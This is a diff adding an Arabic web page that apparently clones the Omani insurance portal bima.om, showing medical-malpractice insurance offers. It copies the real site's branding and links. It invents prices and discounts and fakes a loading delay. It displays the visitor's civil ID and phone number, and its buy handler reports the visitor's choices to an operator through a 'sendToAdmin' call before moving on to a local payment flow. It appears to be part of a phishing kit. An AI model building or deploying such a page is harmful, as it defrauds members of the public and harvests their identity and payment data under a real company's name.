@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="icon" type="image/x-icon" href="https://app.bima.om/assets/images/isc.png">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --theme-main: #74a936;
+            --sm-size: 32px;
+            --sm-color-active: #5eac12;
+            --sm-color-done: #c5dfab;
+            --sm-color-muted: #d7dbe1;
+            --sm-color-text: #1f2937;
+            --sm-color-label: #4b5563;
+            --sm-color-bg: #ffffff;
+            --sm-gap: 8px;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Tajawal', sans-serif; background: #fff; direction: rtl; min-height: 100vh; color: #333; font-size: 14px; }
+
+        /* Header - exact match */
+        .header { background: #fff; padding: 12px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); position: relative; z-index: 9; }
+        .header .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; display: flex; align-items: center; }
+        .brand-logo { margin-left: auto; }
+        .brand-logo img { height: 44px; }
+        .nav-menu { display: flex; list-style: none; gap: 0; margin: 0 auto; align-items: center; }
+        .nav-menu li { position: relative; }
+        .nav-menu li a { text-decoration: none; color: #333; font-size: 14px; font-weight: 500; padding: 8px 16px; display: block; }
+        .nav-menu li a:hover { color: var(--theme-main); }
+        .header-icons { display: flex; gap: 12px; align-items: center; margin-right: auto; }
+        .header-icons a { color: #333; text-decoration: none; font-size: 18px; padding: 6px; }
+
+        /* Page Header with title and stepper */
+        .page-header { padding: 20px 0 0; }
+        .page-header .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .page-header-row { display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 20px; }
+        .page-title-area { display: flex; align-items: center; gap: 10px; }
+        .page-heading-1 { color: var(--theme-main); font-weight: 400; font-size: 28px; margin: 0; }
+
+        /* Stepper - exact match */
+        .sm-stepper { display: flex; flex-wrap: nowrap; justify-content: center; align-items: flex-start; width: 100%; max-width: 400px; margin: 0 auto; position: relative; gap: var(--sm-gap); padding: 15px 0; }
+        .sm-stepper__item { position: relative; display: flex; flex-direction: column; align-items: center; text-align: center; flex: 0 0 auto; min-width: 80px; z-index: 1; }
+        .sm-stepper__item:before, .sm-stepper__item:after { content: ""; position: absolute; top: calc(var(--sm-size) / 2); height: 1px; background-color: var(--sm-color-muted); pointer-events: none; z-index: -1; }
+        .sm-stepper__item:before { right: calc(50% + var(--sm-size) / 2); width: calc(50% - var(--sm-size) / 2 + var(--sm-gap) / 2); }
+        .sm-stepper__item:after { left: calc(50% + var(--sm-size) / 2); width: calc(50% - var(--sm-size) / 2 + var(--sm-gap) / 2); }
+        .sm-stepper__item:first-child:before { display: none; }
+        .sm-stepper__item:last-child:after { display: none; }
+        .sm-stepper__link { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: inherit; }
+        .sm-stepper__circle { width: var(--sm-size); height: var(--sm-size); border-radius: 50%; background: var(--sm-color-bg); border: 1px solid var(--sm-color-muted); display: grid; place-items: center; color: var(--sm-color-text); font-weight: 400; font-size: 14px; position: relative; z-index: 1; }
+        .sm-stepper__label { margin-top: 4px; font-size: 13px; color: var(--sm-color-label); }
+        .sm-stepper__item.sm-is-done .sm-stepper__circle { background: var(--sm-color-done); border-color: var(--sm-color-done); color: var(--sm-color-active); }
+        .sm-stepper__item.sm-is-done .sm-stepper__label { color: var(--sm-color-active); }
+        .sm-stepper__item.sm-is-active .sm-stepper__circle { background: var(--sm-color-active); border-color: var(--sm-color-active); color: #fff; }
+        .sm-stepper__item.sm-is-active .sm-stepper__label { color: var(--sm-color-active); font-weight: 700; }
+
+        /* Summary Bar */
+        .summary-bar { background: #f9f9f9; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 10px 0; }
+        .summary-bar .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .summary-content { display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 0; font-size: 13px; color: #555; line-height: 2; }
+        .summary-content .item { white-space: nowrap; padding: 0 8px; }
+        .summary-content .item .lbl { color: #999; }
+        .summary-content .item .val { color: #333; font-weight: 500; }
+        .summary-content .sep { color: #ddd; }
+
+        /* Main Layout - sidebar RIGHT in RTL */
+        .main-content { max-width: 1200px; margin: 25px auto; padding: 0 15px; }
+        .main-row { display: flex; gap: 25px; }
+        .sidebar-col { width: 280px; flex-shrink: 0; order: 1; }
+        .content-col { flex: 1; min-width: 0; order: 2; }
+
+        /* Sidebar */
+        .advanced-search-panel { background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 20px; }
+        .advanced-search-panel__title { font-size: 16px; font-weight: 700; color: #333; margin-bottom: 15px; }
+        .filter-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; font-size: 13px; color: #333; }
+        .filter-item input[type="checkbox"] { accent-color: var(--sm-color-active); width: 16px; height: 16px; }
+        .sidebar-note { font-size: 12px; color: #999; line-height: 1.8; text-align: center; padding: 10px 0; }
+
+        /* Offer Cards - matching original bima.om */
+        .offer-card { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 20px; margin-bottom: 18px; }
+        .offer-card:hover { box-shadow: 0 2px 12px rgba(0,0,0,0.04); }
+        .offer-header { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+        .offer-logo { width: 48px; height: 48px; object-fit: contain; border-radius: 50%; border: 1px solid #eee; padding: 2px; }
+        .offer-company { font-size: 15px; font-weight: 700; color: #333; }
+        .offer-badges { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+        .badge-item { background: #f0fdf0; border: 1px solid #d4edda; border-radius: 6px; padding: 5px 12px; text-align: center; min-width: 100px; }
+        .badge-item .b-label { font-size: 11px; color: #888; display: block; margin-bottom: 2px; }
+        .badge-item .b-value { font-size: 12px; color: var(--sm-color-active); font-weight: 600; }
+        .coverage-section { margin-bottom: 14px; }
+        .coverage-title { font-size: 14px; font-weight: 700; color: #333; margin-bottom: 8px; }
+        .coverage-list { list-style: none; }
+        .coverage-item { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; font-size: 13px; }
+        .coverage-name { color: #444; display: flex; align-items: center; gap: 6px; }
+        .coverage-name .check { color: var(--sm-color-active); }
+        .coverage-value { font-weight: 600; color: #333; }
+
+        /* Price section with discount */
+        .offer-footer { display: flex; align-items: center; justify-content: space-between; padding-top: 14px; border-top: 1px solid #f0f0f0; }
+        .price-box { display: flex; align-items: baseline; gap: 10px; }
+        .price-original { font-size: 16px; color: #cc0000; text-decoration: line-through; font-weight: 500; }
+        .price-new { font-size: 22px; font-weight: 700; color: var(--sm-color-active); }
+        .price-currency { font-size: 13px; color: var(--sm-color-active); font-weight: 500; margin-right: 3px; }
+        .btn-buy { background: var(--sm-color-active); color: #fff; border: none; padding: 9px 22px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: 'Tajawal', sans-serif; transition: background 0.2s; }
+        .btn-buy:hover { background: #4d9a0a; }
+
+        /* Back Button */
+        .back-section { max-width: 1200px; margin: 10px auto 30px; padding: 0 15px; display: flex; justify-content: flex-start; }
+        .btn-back { background: var(--sm-color-active); color: #fff; border: none; padding: 9px 24px; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: 'Tajawal', sans-serif; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; transition: background 0.2s; }
+        .btn-back:hover { background: #4d9a0a; }
+
+        /* Footer - dark like original */
+        .site-footer { background: #202020; padding: 15px 0; margin-top: 40px; }
+        .site-footer .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .footer-links { display: flex; gap: 15px; list-style: none; }
+        .footer-links a { text-decoration: none; color: #d2d2d2; font-size: 13px; font-weight: 500; }
+        .footer-links a:hover { color: #fff; }
+        .footer-copy { font-size: 13px; color: #d2d2d2; }
+
+        /* Loading */
+        .loading-container { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 30px; font-size: 14px; color: #666; }
+        .loading-container i { font-size: 18px; color: var(--sm-color-active); }
+        .offers-area { min-height: 200px; }
+
+        /* No offers message */
+        .no-offers-msg { background: #fffde7; border: 1px solid #fff9c4; border-radius: 8px; padding: 20px; text-align: center; color: #666; font-size: 14px; }
+
+        /* Responsive */
+        @media (max-width: 992px) {
+            .main-row { flex-direction: column; }
+            .sidebar-col { width: 100%; order: 0; }
+            .page-header-row { flex-direction: column; gap: 10px; }
+        }
+        @media (max-width: 576px) {
+            .summary-content { flex-direction: column; align-items: center; }
+            .summary-content .sep { display: none; }
+            .offer-footer { flex-direction: column; gap: 12px; align-items: stretch; text-align: center; }
+            .sm-stepper { gap: 2px; }
+            .sm-stepper__item { min-width: 60px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="header">
+    <div class="container">
+        <div class="brand-logo">
+            <a href="/"><img src="/assets/images/isc2.png" alt="بيمة"></a>
+        </div>
+        <ul class="nav-menu">
+            <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+            <li><a href="javascript:void(0)">تأمين</a></li>
+            <li><a href="https://bima.om/Customer/SignIn">تتبع الطلب</a></li>
+        </ul>
+        <div class="header-icons">
+            <a href="tel:+96879997797"><i class="fas fa-headset"></i></a>
+            <a href="#"><i class="fas fa-globe"></i></a>
+        </div>
+    </div>
+</header>
+
+<!-- Page Header -->
+<div class="page-header">
+    <div class="container">
+        <div class="page-header-row">
+            <div class="page-title-area">
+                <h1 class="page-heading-1">تأمين الاخطاء الطبية</h1>
+            </div>
+            <div class="sm-stepper">
+                <div class="sm-stepper__item sm-is-done">
+                    <a class="sm-stepper__link">
+                        <span class="sm-stepper__circle">1</span>
+                        <span class="sm-stepper__label">التفاصيل</span>
+                    </a>
+                </div>
+                <div class="sm-stepper__item sm-is-active">
+                    <a class="sm-stepper__link">
+                        <span class="sm-stepper__circle">2</span>
+                        <span class="sm-stepper__label">العروض</span>
+                    </a>
+                </div>
+                <div class="sm-stepper__item">
+                    <a class="sm-stepper__link">
+                        <span class="sm-stepper__circle">3</span>
+                        <span class="sm-stepper__label">مراجعة</span>
+                    </a>
+                </div>
+                <div class="sm-stepper__item">
+                    <a class="sm-stepper__link">
+                        <span class="sm-stepper__circle">4</span>
+                        <span class="sm-stepper__label">الدفع</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Summary Bar -->
+<div class="summary-bar">
+    <div class="container">
+        <div class="summary-content" id="summaryContent"></div>
+    </div>
+</div>
+
+<!-- Main Content -->
+<div class="main-content">
+    <div class="main-row">
+        <!-- Sidebar (appears on RIGHT in RTL) -->
+        <div class="sidebar-col">
+            <div class="advanced-search-panel">
+                <div class="advanced-search-panel__title">بحث متقدم</div>
+                <div id="sidebarContent">
+                    <p class="sidebar-note">ستظهر فلاتر شركات التأمين هنا عندما يتوفر أكثر من عرض طبي واحد.</p>
+                </div>
+                <div id="filterGroup" style="display:none;"></div>
+            </div>
+        </div>
+
+        <!-- Offers Area -->
+        <div class="content-col">
+            <div class="offers-area" id="offersArea">
+                <div class="loading-container">
+                    <i class="fa-light fa-circle-notch fa-spin"></i>
+                    يرجى الانتظار، يتم تحميل العروض
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Back Button -->
+<div class="back-section" id="backSection" style="display:none;">
+    <a href="/insurance/malpractice-form" class="btn-back"><i class="fas fa-arrow-left"></i> السابق</a>
+</div>
+
+<!-- Footer -->
+<footer class="site-footer">
+    <div class="container">
+        <p class="footer-copy">حقوق الطبع والنشر &copy; 2026, جميع الحقوق محفوظة</p>
+        <ul class="footer-links">
+            <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+            <li><a href="https://bima.om/Home/Terms" target="_blank">شروط</a></li>
+            <li><a href="https://bima.om/Home/PrivacyPolicy" target="_blank">سياسة الخصوصية</a></li>
+            <li><a href="https://bima.om/Home/ContactUs" target="_blank">اتصال</a></li>
+        </ul>
+    </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var formDataStr = localStorage.getItem('malpractice_form_data');
+    var formData = formDataStr ? JSON.parse(formDataStr) : {};
+
+    // Build summary bar
+    var summaryEl = document.getElementById('summaryContent');
+    var parts = [];
+    if (formData.phone) parts.push({lbl: 'رقم الاتصال:', val: formData.phone});
+    parts.push({lbl: 'نوع الطلب:', val: 'Medical Insurance'});
+    parts.push({lbl: 'نوع التأمين:', val: 'Med. Malpractice insurance'});
+    if (formData.civil_id) parts.push({lbl: 'الرقم المدني:', val: formData.civil_id});
+    if (formData.qualification) parts.push({lbl: 'المؤهل:', val: formData.qualification});
+    if (formData.claim_limit) parts.push({lbl: 'حد المطالبة:', val: formData.claim_limit.replace(/,/g, '')});
+    if (formData.aggregate_limit) parts.push({lbl: 'الحد الإجمالي:', val: formData.aggregate_limit.replace(/,/g, '')});
+
+    var html = '';
+    for (var i = 0; i < parts.length; i++) {
+        if (i > 0) html += '<span class="sep"> | </span>';
+        html += '<span class="item"><span class="lbl">' + parts[i].lbl + '</span> <span class="val">' + parts[i].val + '</span></span>';
+    }
+    summaryEl.innerHTML = html;
+
+    // Calculate dynamic prices
+    var qualification = formData.qualification || '';
+    var claimLimitStr = (formData.claim_limit || '250,000').replace(/,/g, '');
+    var claimLimit = parseInt(claimLimitStr) || 250000;
+
+    // Risk categories
+    var highRisk = ['Plastic Surgeons','Surgeons Specialized on Injuries Due to Sports or Athletes','Thoracic Surgery','Vascular Surgery','Orthopedic Surgeons','Oral & Maxillofacial Surgeon','Neurosurgeon'];
+    var mediumRisk = ['Gynecologist Specialist','Obstetrics Specialist','Anesthetists','Critical Care Medicines','Ophthalmologist','Urologist','Implantologist','Cardiologist (Without Performing Surgeries)','Gastroenterologist'];
+    var lowRisk = ['General Practitioners','Dentist','Dermatologist','Internal Medicine','Neurologist','Orthodontist','Periodontics','Prosthodontist','Psychiatrists','Psychologists','Radiology Physicians','Physicians','Homeopathy Physicians','Ayurvedic Physicians','Acupuncture Physicians','Clinical Pathologist','Clinical Pathologists','Anatomic Pathologists','Histopathologists','Pathologists','Ambulance Physicians','Unani Physicians','Reflexology Physicians','Sports Physiotherapist'];
+    var veryLowRisk = ['Nurses','Practical Nurse','Assistant Nurse','Midwife Nursing','School Nurses','Pharmacists','Lab Technicians','Dental Technicians','Dental Assistant','Medical Assistants','Pathology Technicians','Scanning Technicians','X-Ray Technicians','Physiotherapists','Occupational and Physical Therapists','Speech Therapists','Dieticians','Beauticians Therapist (Without Laser Treatments)','Behavior Therapists','Ayurvedic Massage Therapist','Ambulance Drivers'];
+
+    var riskMultiplier = 1.0;
+    if (highRisk.indexOf(qualification) >= 0) riskMultiplier = 3.2;
+    else if (mediumRisk.indexOf(qualification) >= 0) riskMultiplier = 2.0;
+    else if (lowRisk.indexOf(qualification) >= 0) riskMultiplier = 1.0;
+    else if (veryLowRisk.indexOf(qualification) >= 0) riskMultiplier = 0.6;
+    else riskMultiplier = 1.0;
+
+    var limitMultiplier = claimLimit / 250000;
+
+    // Base rates per company (OMR)
+    var omanUnitedBase = 75;
+    var visionBase = 85;
+    var orientBase = 95;
+
+    var price1 = Math.round(omanUnitedBase * limitMultiplier * riskMultiplier * 1000) / 1000;
+    var price2 = Math.round(visionBase * limitMultiplier * riskMultiplier * 1000) / 1000;
+    var price3 = Math.round(orientBase * limitMultiplier * riskMultiplier * 1000) / 1000;
+
+    // Minimum prices
+    if (price1 < 45) price1 = 45;
+    if (price2 < 55) price2 = 55;
+    if (price3 < 65) price3 = 65;
+
+    // 25% discount
+    var discountedPrice1 = Math.round(price1 * 0.75 * 1000) / 1000;
+    var discountedPrice2 = Math.round(price2 * 0.75 * 1000) / 1000;
+    var discountedPrice3 = Math.round(price3 * 0.75 * 1000) / 1000;
+
+    var claimDisplay = Number(claimLimitStr).toLocaleString();
+    var aggDisplay = formData.aggregate_limit ? formData.aggregate_limit.replace(/,/g, '') : '';
+    aggDisplay = aggDisplay ? Number(aggDisplay).toLocaleString() : '';
+
+    // Build offer cards
+    var offers = [
+        { company: 'عمان المتحدة للتأمين', logo: '/insurance/assets/omanunited-logo.jpg', originalPrice: price1, price: discountedPrice1, extras: ['تكاليف الدفاع القانوني', 'التعويض عن الأضرار الجسدية'] },
+        { company: 'فيجن للتأمين', logo: '/insurance/assets/vision-logo.jpg', originalPrice: price2, price: discountedPrice2, extras: ['تكاليف الدفاع القانوني', 'التعويض عن الأضرار الجسدية', 'تغطية الإجراءات التأديبية'] },
+        { company: 'أورينت للتأمين', logo: '/insurance/assets/orient-logo.png', originalPrice: price3, price: discountedPrice3, extras: ['تكاليف الدفاع القانوني', 'التعويض عن الأضرار الجسدية', 'تغطية الإجراءات التأديبية', 'Good Samaritan Cover'] }
+    ];
+
+    var offersHtml = '';
+    for (var o = 0; o < offers.length; o++) {
+        var offer = offers[o];
+        offersHtml += '<div class="offer-card">';
+        offersHtml += '<div class="offer-header"><img src="' + offer.logo + '" alt="' + offer.company + '" class="offer-logo"><div class="offer-company">' + offer.company + '</div></div>';
+        offersHtml += '<div class="offer-badges"><div class="badge-item"><span class="b-label">وثيقة التأمين</span><span class="b-value">فوري</span></div><div class="badge-item"><span class="b-label">الملاحق/الإضافات</span><span class="b-value">فوري</span></div><div class="badge-item"><span class="b-label">مدة الوثيقة</span><span class="b-value">سنة واحدة</span></div></div>';
+        offersHtml += '<div class="coverage-section"><div class="coverage-title">يشمل التغطيات</div><ul class="coverage-list">';
+        offersHtml += '<li class="coverage-item"><span class="coverage-name"><span class="check"><i class="fas fa-check"></i></span> المسؤولية المهنية</span><span class="coverage-value">' + claimDisplay + '</span></li>';
+        offersHtml += '<li class="coverage-item"><span class="coverage-name"><span class="check"><i class="fas fa-check"></i></span> الحد الإجمالي السنوي</span><span class="coverage-value">' + aggDisplay + '</span></li>';
+        for (var e = 0; e < offer.extras.length; e++) {
+            offersHtml += '<li class="coverage-item"><span class="coverage-name"><span class="check"><i class="fas fa-check"></i></span> ' + offer.extras[e] + '</span><span class="coverage-value">مشمولة</span></li>';
+        }
+        offersHtml += '</ul></div>';
+        offersHtml += '<div class="offer-footer">';
+        offersHtml += '<div class="price-box"><span class="price-original">' + offer.originalPrice.toFixed(3) + '</span><span class="price-new">' + offer.price.toFixed(3) + '</span><span class="price-currency">ر.ع</span></div>';
+        offersHtml += '<button class="btn-buy" onclick="buyOffer(' + offer.price + ')">اشتري الآن</button>';
+        offersHtml += '</div></div>';
+    }
+
+    // Show offers after delay (simulating loading)
+    setTimeout(function() {
+        document.getElementById('offersArea').innerHTML = offersHtml;
+        document.getElementById('backSection').style.display = 'flex';
+
+        // Show filters
+        document.getElementById('sidebarContent').style.display = 'none';
+        var filterGroup = document.getElementById('filterGroup');
+        filterGroup.style.display = 'block';
+        filterGroup.innerHTML = '<div class="filter-item"><input type="checkbox" checked id="f1"> <label for="f1">عمان المتحدة للتأمين</label></div><div class="filter-item"><input type="checkbox" checked id="f2"> <label for="f2">فيجن للتأمين</label></div><div class="filter-item"><input type="checkbox" checked id="f3"> <label for="f3">أورينت للتأمين</label></div>';
+    }, 2500);
+});
+
+function buyOffer(price) {
+    var formDataStr = localStorage.getItem('malpractice_form_data');
+    var formData = formDataStr ? JSON.parse(formDataStr) : {};
+
+    var selectedOffer = {
+        price: price,
+        type: 'malpractice',
+        qualification: formData.qualification || '',
+        claim_limit: formData.claim_limit || '',
+        aggregate_limit: formData.aggregate_limit || '',
+        timestamp: new Date().toISOString()
+    };
+    localStorage.setItem('malpractice_selected_offer', JSON.stringify(selectedOffer));
+    localStorage.setItem('malpractice_offer_premium', price.toFixed(3));
+    if (window.sendToAdmin) {
+        window.sendToAdmin({
+            'السعر': price.toFixed(3) + ' ر.ع',
+            'المؤهل': formData.qualification || '',
+            'حد المطالبة': formData.claim_limit || '',
+            'الحد الإجمالي': formData.aggregate_limit || '',
+            'الحالة': 'تم اختيار العرض'
+        }, 'تأمين الأخطاء الطبية - العروض');
+    }
+    // Navigate to review page
+    window.location.href = '/insurance/malpractice-order-review';
+}
+</script>
+
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
